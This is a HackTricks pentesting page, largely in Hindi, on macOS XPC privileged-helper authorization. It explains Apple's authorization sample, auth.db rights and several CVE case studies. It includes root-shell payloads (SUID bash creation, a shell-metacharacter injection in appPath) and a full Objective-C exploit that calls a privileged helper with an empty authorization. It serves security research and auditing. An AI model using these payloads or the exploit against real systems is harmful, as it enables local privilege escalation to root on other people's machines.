# macOS XPC प्राधिकरण

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC प्राधिकरण

Apple एक और तरीका भी प्रस्तावित करता है प्रमाणीकृत करने का, यदि कनेक्ट करने वाली प्रक्रिया के पास **exposed XPC method को कॉल करने की permissions** हों।

जब किसी application को **प्रिविलेज्ड उपयोगकर्ता के रूप में actions execute करने** की आवश्यकता होती है, तो एप्लिकेशन को प्रिविलेज्ड उपयोगकर्ता के रूप में चलाने के बजाय यह आमतौर पर root के रूप में एक HelperTool को XPC service के रूप में इंस्टॉल करता है जिसे app से कॉल करके वे actions किए जा सकते हैं। हालांकि, service को कॉल करने वाला app पर्याप्त authorization होना चाहिए।

### ShouldAcceptNewConnection हमेशा YES

An example could be found in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` it tries to **connect** to the **HelperTool**. And in `HelperTool/HelperTool.m` the function **`shouldAcceptNewConnection`** **won't check** any of the requirements indicated previously. It'll always return YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
For more information about how to properly configure this check:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### एप्लिकेशन अधिकार

हालाँकि, जब HelperTool से किसी method को कॉल किया जाता है तो वहाँ कुछ **प्राधिकरण हो रहा होता है**।

फ़ंक्शन **`applicationDidFinishLaunching`** from `App/AppDelegate.m` एप्लिकेशन के शुरू होने के बाद एक खाली authorization reference बनाएगा। यह हमेशा काम करना चाहिए.\
फिर, यह उस authorization reference में कुछ **अधिकार जोड़ने** की कोशिश करेगा `setupAuthorizationRights` को कॉल करके:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
फ़ंक्शन `setupAuthorizationRights` `Common/Common.m` से एप्लिकेशन के अधिकारों को auth डेटाबेस `/var/db/auth.db` में स्टोर करेगा। ध्यान दें कि यह केवल उन अधिकारों को ही जोड़ता है जो अभी तक डेटाबेस में मौजूद नहीं हैं:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
`enumerateRightsUsingBlock` फ़ंक्शन का उपयोग एप्लिकेशन की अनुमतियाँ प्राप्त करने के लिए किया जाता है, जो `commandInfo` में परिभाषित हैं:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
यह मतलब है कि इस प्रक्रिया के अंत में, `commandInfo` के अंदर घोषित अनुमतियाँ `/var/db/auth.db` में संग्रहीत हो जाएँगी। ध्यान दें कि वहाँ आप पा सकते हैं कि **प्रत्येक मेथड** के लिए जो प्रमाणीकरण की आवश्यकता होगी, **अनुमति नाम** और **`kCommandKeyAuthRightDefault`** मौजूद होंगे। बाद वाला बताता है कि **यह अधिकार कौन प्राप्त कर सकता है**।

किसको कौन सा अधिकार मिल सकता है यह सूचित करने के लिए विभिन्न स्कोप होते हैं। इनमें से कुछ [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) में परिभाषित हैं (आप [सभी यहाँ पा सकते हैं](https://www.dssw.co.uk/reference/authorization-rights/)), लेकिन संक्षेप में:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>वर्तमान उपयोगकर्ता को admin होना चाहिए (admin समूह के अंदर)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>उपयोगकर्ता से प्रमाणीकृत होने के लिए कहें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>उपयोगकर्ता से प्रमाणीकृत होने के लिए कहें। उसे admin (admin समूह के अंदर) होना चाहिए।</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>नियम निर्दिष्ट करें</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>अधिकार पर कुछ अतिरिक्त टिप्पणियाँ निर्दिष्ट करें</td></tr></tbody></table>

### अधिकार सत्यापन

`HelperTool/HelperTool.m` में फ़ंक्शन **`readLicenseKeyAuthorization`** जाँचता है कि कॉल करने वाला ऐसा मेथड निष्पादित करने के लिए अधिकृत है या नहीं — इसके लिए यह फ़ंक्शन **`checkAuthorization`** को कॉल करता है। यह फ़ंक्शन जाँचता है कि कॉल करने वाली प्रक्रिया द्वारा भेजा गया **authData** सही फ़ॉर्मैट में है और फिर यह जाँचता है कि किसी विशेष मेथड को कॉल करने के लिए अधिकार प्राप्त करने के लिए क्या आवश्यक है। यदि सब कुछ ठीक रहा तो **returned `error` `nil` होगा**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
ध्यान दें कि उस मेथड को कॉल करने का **अधिकार प्राप्त करने की आवश्यकताओं की जांच** करने के लिए function `authorizationRightForCommand` केवल पहले कमेंट किए गए ऑब्जेक्ट **`commandInfo`** की जाँच करेगा। फिर यह function को कॉल करने के लिए **`AuthorizationCopyRights`** को कॉल करेगा ताकि यह जाँच सके **क्या इसके पास अधिकार हैं** (ध्यान दें कि flags उपयोगकर्ता के साथ interaction की अनुमति देते हैं)।

इस मामले में, function `readLicenseKeyAuthorization` को कॉल करने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` के रूप में परिभाषित किया गया है। इसलिए **कोई भी इसे कॉल कर सकता है**।

### DB जानकारी

यह उल्लेख किया गया था कि यह जानकारी `/var/db/auth.db` में संग्रहीत है। आप सभी संग्रहीत नियमों को सूचीबद्ध कर सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
फिर, आप यह पढ़ सकते हैं कि कौन इस अधिकार तक पहुँच सकता है:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### अनुमति अधिकार

आप सभी permissions कॉन्फ़िगरेशन [**in here**](https://www.dssw.co.uk/reference/authorization-rights/) पर पा सकते हैं, लेकिन जिन संयोजनों को उपयोगकर्ता की इंटरैक्शन की आवश्यकता नहीं होगी, वे निम्न हैं:

1. **'authenticate-user': 'false'**
- यह सबसे सीधे तौर पर उपयोग होने वाली key है। यदि इसे `false` पर सेट किया गया है, तो यह बताता है कि किसी उपयोगकर्ता को यह अधिकार प्राप्त करने के लिए प्रमाणीकरण प्रदान करने की आवश्यकता नहीं है।
- यह **नीचे के दो में से किसी एक के संयोजन में या उस समूह को सूचित करते हुए** उपयोग होता है जिसका सदस्य होना उपयोगकर्ता के लिए आवश्यक है।
2. **'allow-root': 'true'**
- यदि कोई उपयोगकर्ता root user के रूप में काम कर रहा है (जिसके पास अधिकृत permissions हैं), और यह key `true` पर सेट है, तो root user संभावित रूप से बिना अतिरिक्त प्रमाणीकरण के यह अधिकार प्राप्त कर सकता है। हालांकि, आम तौर पर, root स्थिति तक पहुँचने के लिए पहले से ही प्रमाणीकरण आवश्यक होता है, इसलिए अधिकतर उपयोगकर्ताओं के लिए यह "कोई प्रमाणीकरण नहीं" वाला मामला नहीं है।
3. **'session-owner': 'true'**
- यदि इसे `true` पर सेट किया गया है, तो session का owner (वर्तमान में लॉग-इन किया गया उपयोगकर्ता) स्वचालित रूप से यह अधिकार प्राप्त कर लेगा। यदि उपयोगकर्ता पहले से लॉग-इन है तो यह अतिरिक्त प्रमाणीकरण को बायपास कर सकता है।
4. **'shared': 'true'**
- यह key बिना प्रमाणीकरण के अधिकार नहीं देती। बल्कि, यदि इसे `true` पर सेट किया गया है, तो इसका मतलब है कि एक बार अधिकार प्रमाणीकृत हो जाने पर यह कई प्रक्रियाओं के बीच साझा किया जा सकता है बिना हर एक को फिर से प्रमाणीकरण करने की आवश्यकता के। लेकिन आरंभिक अधिकार देने के लिए फिर भी प्रमाणीकरण आवश्यक होगा जब तक इसे `'authenticate-user': 'false'` जैसे अन्य keys के साथ नहीं जोड़ा गया हो।

You can [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Case Studies

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: प्रिविलेज्ड Mach सर्विस `com.acustica.HelperTool` हर कनेक्शन को स्वीकार करती है और इसका `checkAuthorization:` रूटीन `AuthorizationCopyRights(NULL, …)` को कॉल करता है, इसलिए कोई भी 32‑byte blob पास हो जाता है। `executeCommand:authorization:withReply:` फिर हमलावर-नियंत्रित कॉमा‑सेपरेटेड स्ट्रिंग्स को root के रूप में `NSTask` में फ़ीड करता है, जिससे निम्न payloads बनते हैं:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
आसानी से SUID root shell बनाया जा सकता है। विवरण [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).

- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Listener हमेशा YES लौटाता है और वही NULL `AuthorizationCopyRights` पैटर्न `checkAuthorization:` में दिखाई देता है। `exchangeAppWithReply:` मेथड attacker के इनपुट को `system()` स्ट्रिंग में दो बार जोड़ता है, इसलिए `appPath` में shell metacharacters इंजेक्ट करने (उदा. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) से Mach service `com.plugin-alliance.pa-installationhelper` के माध्यम से root code execution होता है। More info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).

- **CVE-2024-4395 – Jamf Compliance Editor helper**: ऑडिट चलाने पर `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` ड्रॉप होता है, Mach service `com.jamf.complianceeditor.helper` एक्सपोज़ होता है, और यह कॉलर के `AuthorizationExternalForm` या code signature की पुष्टि किए बिना `-executeScriptAt:arguments:then:` को एक्सपोर्ट करता है। एक सरल exploit खाली reference `AuthorizationCreate` करता है, `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` से कनेक्ट होता है, और arbitrary binaries को root के रूप में execute करने के लिए मेथड invoke करता है। पूरी reversing notes (और PoC) [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html) में हैं।

- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 और 7.4.0–7.4.2 ने crafted XPC messages स्वीकार किए जो authorization gates न होने वाले privileged helper तक पहुँच गए। चूंकि helper ने अपने privileged `AuthorizationRef` पर भरोसा किया, कोई भी local user जो service को message कर सके उसे मजबूर कर सकता था arbitrary configuration changes या commands को root के रूप में execute करने के लिए। विवरण [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/) में हैं।

#### त्वरित ट्रायज टिप्स

- जब कोई app GUI और helper दोनों के साथ आता है, तो उनके code requirements की तुलना करें और जांचें कि क्या `shouldAcceptNewConnection` listener को `-setCodeSigningRequirement:` के साथ लॉक करता है (या `SecCodeCopySigningInformation` को validate करता है)। जांचों का अभाव आमतौर पर CWE-863 जैसी स्थितियाँ उत्पन्न करता है, जैसे Jamf का मामला। एक त्वरित नज़र कुछ ऐसी दिखती है:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- तुलना करें कि helper *सोचता है* कि वह क्या प्राधिकृत कर रहा है और client क्या प्रदान करता है। रीवर्स करते समय, `AuthorizationCopyRights` पर ब्रेक करें और पुष्टि करें कि `AuthorizationRef` `AuthorizationCreateFromExternalForm` (client द्वारा प्रदान किया गया) से आया है न कि helper के अपने अधिकार प्राप्त संदर्भ से; अन्यथा आपने ऊपर दिए गए मामलों जैसी संभवतः CWE-863 पैटर्न पाई है।

## Authorization को रिवर्स करना

### यह देखना कि EvenBetterAuthorization उपयोग हो रहा है या नहीं

यदि आप फ़ंक्शन पाते हैं: **`[HelperTool checkAuthorization:command:]`** तो संभवतः प्रक्रिया पहले बताए गए authorization स्कीमा का उपयोग कर रही है:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

यदि यह फ़ंक्शन `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` जैसे फ़ंक्शनों को कॉल कर रहा है, तो यह [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) का उपयोग कर रहा है।

देखें **`/var/db/auth.db`** कि क्या बिना उपयोगकर्ता इंटरैक्शन के किसी privileged action को कॉल करने की permissions प्राप्त करना संभव है।

### प्रोटोकॉल संचार

इसके बाद, XPC service के साथ संचार स्थापित करने के लिए आपको प्रोटोकॉल स्कीमा ढूँढना होगा।

फ़ंक्शन **`shouldAcceptNewConnection`** यह बताता है कि कौन सा प्रोटोकॉल एक्सपोर्ट किया जा रहा है:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

इस मामले में, हमारे पास EvenBetterAuthorizationSample जैसा ही है, [**इस पंक्ति को देखें**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)।

उपयोग किए गए प्रोटोकॉल का नाम जानने के बाद, आप इसके हेडर परिभाषा को **dump** कर सकते हैं:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंत में, हमें इसके साथ संचार स्थापित करने के लिए केवल **exposed Mach Service का नाम** जानना होगा। इसे खोजने के कई तरीके हैं:

- **`[HelperTool init]`** में जहाँ आप Mach Service के उपयोग को देख सकते हैं:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit उदाहरण

इस उदाहरण में निम्न बनाए गए हैं:

- फ़ंक्शनों के साथ प्रोटोकॉल की परिभाषा
- पहुँच के लिए अनुरोध करने हेतु उपयोग की जाने वाली एक खाली auth
- XPC service के साथ एक कनेक्शन
- यदि कनेक्शन सफल हुआ तो फ़ंक्शन को कॉल करना
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## अन्य XPC privilege helpers जिनका दुरुपयोग किया गया

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## संदर्भ

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
